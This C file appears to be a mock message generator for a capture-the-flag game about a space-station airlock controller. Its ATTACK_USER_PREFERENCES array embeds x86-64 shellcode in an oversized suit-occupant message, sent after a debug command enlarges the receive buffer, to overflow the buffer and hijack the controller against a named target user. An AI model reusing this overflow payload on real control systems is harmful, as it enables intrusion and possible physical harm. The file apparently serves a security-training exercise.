#include <assert.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "log.h"
#include "sdn_interface.h"

static const uint64_t YEAR_IN_MS = 365 * 24 * 60 * 60 * 1000ull;

#define STATION_PRESSURE_PA 101325

static const sdn_timestamp_t START_TIMESTAMP = YEAR_IN_MS * 1.989438645;

static const uint32_t SDN_DEVICE_ID_DOOR_INNER = 0xae215e12;
static const uint32_t SDN_DEVICE_ID_DOOR_OUTER = 0xae215e13;
static const uint32_t SDN_DEVICE_ID_PRESSURE_CTRL = 0xae215e14;
static const uint32_t SDN_DEVICE_ID_OCCUPANCY_SENSOR = 0xae215e15;
static const uint32_t PATSY_USER_ID = 0xd481aa99;
static const uint32_t TARGET_USER_ID = 0x488504f4;

static const uint32_t SDN_DEVICE_ID_CONTROL_PANEL_STATION = 0xae215e16;
static const uint32_t SDN_DEVICE_ID_CONTROL_PANEL_AIRLOCK = 0xae215e17;

static sdn_timestamp_t dummy_timestamp = START_TIMESTAMP;
static float airlock_pressure = STATION_PRESSURE_PA;

static const uint8_t INNER_PRESSURE_ZONE = 0;
static const uint8_t OUTER_PRESSURE_ZONE = 1;

#define SMALL_BUFFER_SIZE 256

#define ATTACK_USER_PREF_SIZE 264
// clang-format off
static const uint8_t ATTACK_USER_PREFERENCES[ATTACK_USER_PREF_SIZE] = {
0x76,0x6f,0x6c,0x75,0x6d,0x65,0x00,0x00,0x37,0x35,0x00,0x00,0x00,0x00,0x00,0x00,
0x74,0x65,0x6d,0x70,0x75,0x6e,0x69,0x74,0x63,0x65,0x6c,0x73,0x69,0x75,0x73,0x00,
0x64,0x69,0x73,0x70,0x62,0x72,0x67,0x74,0x68,0x69,0x67,0x68,0x00,0x00,0x00,0x00,
0x68,0x75,0x64,0x61,0x6c,0x70,0x68,0x61,0x38,0x35,0x00,0x00,0x00,0x00,0x00,0x00,
0x66,0x6f,0x6e,0x74,0x73,0x69,0x7a,0x65,0x6d,0x65,0x64,0x69,0x75,0x6d,0x00,0x00,
0x6c,0x61,0x6e,0x67,0x75,0x61,0x67,0x65,0x65,0x6e,0x67,0x6c,0x69,0x73,0x68,0x00,
0x61,0x75,0x64,0x69,0x6f,0x62,0x61,0x6c,0x63,0x65,0x6e,0x74,0x65,0x72,0x00,0x00,
0x63,0x6f,0x6e,0x74,0x72,0x61,0x73,0x74,0x36,0x30,0x00,0x00,0x00,0x00,0x00,0x00,
0x62,0x65,0x65,0x70,0x76,0x6f,0x6c,0x00,0x35,0x30,0x00,0x00,0x00,0x00,0x00,0x00,
0x55,0x49,0xbf,0x7e,0x5e,0x55,0x55,0x55,0x55,0x00,0x00,0x49,0x89,0xfc,0x49,0x83,
0xc4,0x10,0x41,0x81,0x3c,0x24,0xf4,0x04,0x85,0x48,0x75,0x3a,0x49,0x89,0xfc,0x49,
0x89,0xf5,0x49,0x89,0xd6,0x48,0xb8,0x69,0x52,0x55,0x55,0x55,0x55,0x00,0x00,0xbf,
0x67,0x5d,0x21,0xae,0xbe,0x13,0x5e,0x21,0xae,0xba,0x01,0x00,0x00,0x00,0xff,0xd0,
0x62,0x61,0x73,0x73,0x76,0x6f,0x6c,0x6d,0x38,0x33,0x00,0x00,0x00,0x00,0x00,0x00,
0x4c,0x89,0xee,0x4c,0x89,0xf2,0x41,0xff,0xd7,0x5d,0xc3,0x90,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x00,0x00,
0x4c,0xe9,0xff,0xff,0xff,0x7f,0x00,0x00,
};
// clang-format on

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool RegisterDevice(uint32_t device_id, SDNDeviceType device_type)
{
    (void)device_id;
    (void)device_type;

    return true;
}

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool BroadcastHeartbeat(uint32_t fault_bits)
{
    (void)fault_bits;
    return true;
}

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
sdn_timestamp_t GetCurrentTimestampMS(void) { return dummy_timestamp; }

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
void SleepMS(unsigned ms) { dummy_timestamp += ms; }

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool SubscribeToMessage(uint32_t device_id, SDNMsgType message_type)
{
    (void)device_id;
    (void)message_type;
    return true;
}

static size_t SendPressure(void *msg_buffer, size_t buffer_size_bytes,
                           uint32_t pressure_device_id, uint32_t measurement_id,
                           float pressure,
                           sdn_timestamp_t *next_pressure_time)
{
    if (buffer_size_bytes >= sizeof(SDNPressureMessage))
    {
        SDNPressureMessage *msg = (SDNPressureMessage *)msg_buffer;
        msg->msg_header.device_id = pressure_device_id;
        msg->msg_header.msg_length = sizeof(SDNPressureMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_SENSOR_PRESSURE;
        msg->msg_header.timestamp = dummy_timestamp;
        msg->measurement_id = measurement_id, msg->pressure_pa = pressure;
        *next_pressure_time += 50;
        return sizeof(SDNPressureMessage);
    }
    else
    {
        sdn_log(SDN_ERROR,
                "ReadNextMessage: buffer too small for SDNPressureMessage");
        return 0;
    }
}

static size_t SendPressureInt1(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SendPressureInt1");
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_INNER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_1,
                        STATION_PRESSURE_PA, next_time_ms);
}

static size_t SendPressureInt2(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SendPressureInt2");
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_INNER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_2, airlock_pressure,
                        next_time_ms);
}

static size_t SendPressureExt1(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SendPressureExt1");
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_OUTER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_1, 0, next_time_ms);
}

static size_t SendPressureExt2(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SendPressureExt2");
    return SendPressure(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_OUTER,
                        SDN_MEASUREMENT_ID_DOOR_PRESSURE_SIDE_2, airlock_pressure,
                        next_time_ms);
}

static size_t SendHeartBeat(void *msg_buffer, size_t buffer_size_bytes,
                            uint32_t device_id, sdn_timestamp_t *next_time)
{
    if (buffer_size_bytes >= sizeof(SDNHeartBeatMessage))
    {
        SDNHeartBeatMessage *msg = (SDNHeartBeatMessage *)msg_buffer;
        msg->msg_header.device_id = device_id;
        msg->msg_header.msg_length = sizeof(SDNHeartBeatMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_HEARTBEAT;
        msg->msg_header.timestamp = dummy_timestamp;
        msg->health = 0, *next_time += 50;
        return sizeof(SDNHeartBeatMessage);
    }
    else
    {
        sdn_log(SDN_ERROR,
                "ReadNextMessage: buffer too small for SDNHeartBeatMessage");
        return 0;
    }
}

static size_t SendHeartBeatInt(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SendHeartBeatInt");
    return SendHeartBeat(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_INNER,
                         next_time_ms);
}

static size_t SendHeartBeatExt(void *msg_buffer, size_t buffer_size_bytes,
                               sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SendHeartBeatExt");
    return SendHeartBeat(msg_buffer, buffer_size_bytes, SDN_DEVICE_ID_DOOR_OUTER,
                         next_time_ms);
}

static size_t SendAirlockCmd(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms,
                             SDNAirlockOpen open_state)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    if (buffer_size_bytes >= sizeof(SDNSetAirlockOpenMessage))
    {
        SDNSetAirlockOpenMessage *msg = (SDNSetAirlockOpenMessage *)msg_buffer;
        msg->msg_header.device_id = SDN_DEVICE_ID_CONTROL_PANEL_STATION;
        msg->msg_header.msg_length = sizeof(SDNSetAirlockOpenMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_SET_AIRLOCK_OPEN;
        msg->msg_header.timestamp = dummy_timestamp;
        msg->open = open_state;
        return sizeof(SDNSetAirlockOpenMessage);
    }
    else
    {
        sdn_log(SDN_ERROR,
                "ReadNextMessage: buffer too small for SDNSetAirlockOpenMessage");
    }
    return 0;
}

static size_t SendAirlockIntOpenCmd(void *msg_buffer, size_t buffer_size_bytes,
                                    sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SDN_AIRLOCK_INTERIOR_OPEN");
    return SendAirlockCmd(msg_buffer, buffer_size_bytes, next_time_ms,
                          SDN_AIRLOCK_INTERIOR_OPEN);
}

static size_t SendAirlockExtOpenCmd(void *msg_buffer, size_t buffer_size_bytes,
                                    sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SDN_AIRLOCK_EXTERIOR_OPEN");
    return SendAirlockCmd(msg_buffer, buffer_size_bytes, next_time_ms,
                          SDN_AIRLOCK_EXTERIOR_OPEN);
}

static size_t SendAirlockCloseCmd(void *msg_buffer, size_t buffer_size_bytes,
                                  sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "SDN_AIRLOCK_CLOSED");
    return SendAirlockCmd(msg_buffer, buffer_size_bytes, next_time_ms,
                          SDN_AIRLOCK_CLOSED);
}

static size_t SendLargeBufferSizeConfigCmd(void *msg_buffer,
                                           size_t buffer_size_bytes,
                                           sdn_timestamp_t *next_time_ms)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    if (buffer_size_bytes >= sizeof(SDNDebugWriteConfigInt))
    {
        SDNDebugWriteConfigInt *msg = (SDNDebugWriteConfigInt *)msg_buffer;
        msg->msg_header.device_id = SDN_DEVICE_ID_CONTROL_PANEL_STATION;
        msg->msg_header.msg_length = sizeof(SDNSetAirlockOpenMessage);
        msg->msg_header.msg_type = SDN_MSG_TYPE_DEBUG_WRITE_CONFIG_INT;
        msg->msg_header.timestamp = dummy_timestamp;
        strcpy(msg->key, "rx_message_buffer_size");
        msg->value = 2048;
        return sizeof(SDNDebugWriteConfigInt);
    }
    else
    {
        sdn_log(
            SDN_ERROR,
            "ReadNextMessage: buffer too small for SendLargeBufferSizeConfigCmd");
    }
    return 0;
}

static size_t SendAttackCmd(void *msg_buffer, size_t buffer_size_bytes,
                            sdn_timestamp_t *next_time_ms,
                            bool trigger_overflow)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    const size_t MSG_LEN =
        (trigger_overflow)
            ? sizeof(SDNSetSuitOccupantMessage) + sizeof(ATTACK_USER_PREFERENCES)
            : SMALL_BUFFER_SIZE;
    if (buffer_size_bytes >= MSG_LEN)
    {
        SDNSetSuitOccupantMessage *msg = (SDNSetSuitOccupantMessage *)msg_buffer;
        *msg = (SDNSetSuitOccupantMessage){
            {.device_id = SDN_DEVICE_ID_CONTROL_PANEL_AIRLOCK,
             .msg_length = MSG_LEN,
             .timestamp = dummy_timestamp,
             .msg_type = SDN_MSG_TYPE_SET_SUIT_OCCUPANT},
            .user_id = PATSY_USER_ID};
        memcpy(msg->user_preferences, ATTACK_USER_PREFERENCES,
               MSG_LEN - sizeof(SDNSetSuitOccupantMessage));
        return MSG_LEN;
    }
    else
    {
        sdn_log(
            SDN_ERROR,
            "ReadNextMessage: buffer too small for SendLargeBufferSizeConfigCmd");
    }
    return 0;
}

static size_t SendAttackCmd1(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "ATTACK_CMD1");
    return SendAttackCmd(msg_buffer, buffer_size_bytes, next_time_ms, false);
}

static size_t SendAttackCmd2(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms)
{
    sdn_log(SDN_DEBUG, "ATTACK_CMD2");
    return SendAttackCmd(msg_buffer, buffer_size_bytes, next_time_ms, true);
}

static size_t SendFailureCmd(void *msg_buffer, size_t buffer_size_bytes,
                             sdn_timestamp_t *next_time_ms)
{
    *next_time_ms = 0xFFFFFFFFFFFFFFFF;
    sdn_log(SDN_DEBUG, "FAILURE_CMD");
    if (buffer_size_bytes >= sizeof(SDNSetSuitOccupantMessage))
    {
        SDNSetSuitOccupantMessage *msg = (SDNSetSuitOccupantMessage *)msg_buffer;
        *msg = (SDNSetSuitOccupantMessage){
            {.device_id = SDN_DEVICE_ID_CONTROL_PANEL_AIRLOCK,
             .msg_length = sizeof(SDNSetSuitOccupantMessage),
             .timestamp = dummy_timestamp,
             .msg_type = SDN_MSG_TYPE_SET_SUIT_OCCUPANT},
            .user_id = TARGET_USER_ID};
        return sizeof(SDNSetSuitOccupantMessage);
    }
    else
    {
        sdn_log(
            SDN_ERROR,
            "ReadNextMessage: buffer too small for SendLargeBufferSizeConfigCmd");
    }
    return 0;
}

typedef size_t (*MessageGenerator)(void *msg_buffer, size_t buffer_size_bytes,
                                   sdn_timestamp_t *next_time_ms);
typedef struct MessageEvent MessageEvent;
struct MessageEvent
{
    sdn_timestamp_t next_time_ms;
    MessageGenerator generator;
};

static MessageEvent message_events[] = {
    {.next_time_ms = 5, .generator = SendHeartBeatInt},
    {.next_time_ms = 5, .generator = SendPressureInt1},
    {.next_time_ms = 5, .generator = SendPressureInt2},
    {.next_time_ms = 6, .generator = SendHeartBeatExt},
    {.next_time_ms = 6, .generator = SendPressureExt1},
    {.next_time_ms = 6, .generator = SendPressureExt2},
    {.next_time_ms = 250, .generator = SendAirlockIntOpenCmd},
    {.next_time_ms = 350, .generator = SendAirlockExtOpenCmd},
    {.next_time_ms = 450, .generator = SendAirlockExtOpenCmd},
    {.next_time_ms = 550, .generator = SendAirlockIntOpenCmd},
    {.next_time_ms = 650, .generator = SendAirlockExtOpenCmd},
    {.next_time_ms = 1000, .generator = SendAirlockCloseCmd},
    {.next_time_ms = 1250, .generator = SendAirlockIntOpenCmd},
    {.next_time_ms = 2000, .generator = SendLargeBufferSizeConfigCmd},
    {.next_time_ms = 2100, .generator = SendAttackCmd1},
    {.next_time_ms = 2200, .generator = SendAttackCmd2},
    {.next_time_ms = 2300, .generator = SendFailureCmd},
};
static size_t NUM_MESSAGE_EVENTS =
    sizeof(message_events) / sizeof(MessageEvent);

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
int ReadNextMessage(void *msg_buffer, size_t buffer_size_bytes)
{
    for (size_t i = 0; i < NUM_MESSAGE_EVENTS; i++)
    {
        if (dummy_timestamp - START_TIMESTAMP > message_events[i].next_time_ms)
        {
            return (*message_events[i].generator)(msg_buffer, buffer_size_bytes,
                                                  &message_events[i].next_time_ms);
        }
    }

    return 0;
}

// DUMMY IMPLEMENTATIONS FOR GAME DATA GENERATION
bool ExecuteCmd(const SDNMsgHeader *header, uint32_t target_device_id)
{
    if (target_device_id == SDN_DEVICE_ID_PRESSURE_CTRL &&
        header->msg_type == SDN_MSG_TYPE_SET_PRESSURE_ZONE)
    {
        SDNSetPressureZoneMessage *pressure_cmd =
            (SDNSetPressureZoneMessage *)header;
        if (pressure_cmd->zone_id == INNER_PRESSURE_ZONE)
        {
            airlock_pressure = STATION_PRESSURE_PA;
        }
        else if (pressure_cmd->zone_id == OUTER_PRESSURE_ZONE)
        {
            airlock_pressure = 0;
        }
        else
        {
            sdn_log(SDN_WARN, "Invalid pressure zone");
            return false;
        }
    }

    return true;
}

SDNResponseStatus GetResponse(void *msg_buffer, size_t buffer_size_bytes,
                              uint32_t target_device_id,
                              SDNMsgType request_type)
{
    (void)target_device_id;

    if (request_type == SDN_MSG_TYPE_SENSOR_OCCUPANCY)
    {
        if (buffer_size_bytes >= sizeof(SDNOccupancyMessage))
        {
            SDNOccupancyMessage *msg_ptr = msg_buffer;
            msg_ptr->msg_header.device_id = SDN_DEVICE_ID_OCCUPANCY_SENSOR;
            msg_ptr->msg_header.msg_length = sizeof(SDNOccupancyMessage);
            msg_ptr->msg_header.msg_type = SDN_MSG_TYPE_SENSOR_OCCUPANCY;
            msg_ptr->msg_header.timestamp = dummy_timestamp;
            msg_ptr->measurement_id = 0;
            return SDN_RESPONSE_GOOD;
        }
        else
        {
            sdn_log(SDN_ERROR, "SDN_MSG_TYPE_SENSOR_OCCUPANCY too large %d",
                    sizeof(SDNOccupancyMessage));
            return SDN_RESPONSE_BUFFER_TOO_SMALL;
        }
    }

    sdn_log(SDN_ERROR, "Response request failed");
    return SDN_RESPONSE_FAILED;
}

int ProcessMessageData(SDNHandler *handlers, size_t num_handlers,
                       void *msg_buffer, size_t buffer_size_bytes, void *context)
{
    assert(handlers != NULL);
    assert(msg_buffer != NULL);
    assert(buffer_size_bytes >= sizeof(SDNMsgHeader));
    while (true)
    {
        int ret = ReadNextMessage(msg_buffer, buffer_size_bytes);
        if (ret < 0)
        {
            return ret;
        }
        else if (ret == 0)
        {
            return 0;
        }
        else
        {
            SDNMsgHeader *msg_header = (SDNMsgHeader *)msg_buffer;
            for (SDNHandler *handler = handlers; handler < handlers + num_handlers;
                 handler++)
            {
                if (msg_header->msg_type == handler->type)
                {
                    handler->callback(msg_buffer, ret, context);
                }
            }
        }
    }
}

void SendCmdResponse(uint32_t response_code) { (void)response_code; }
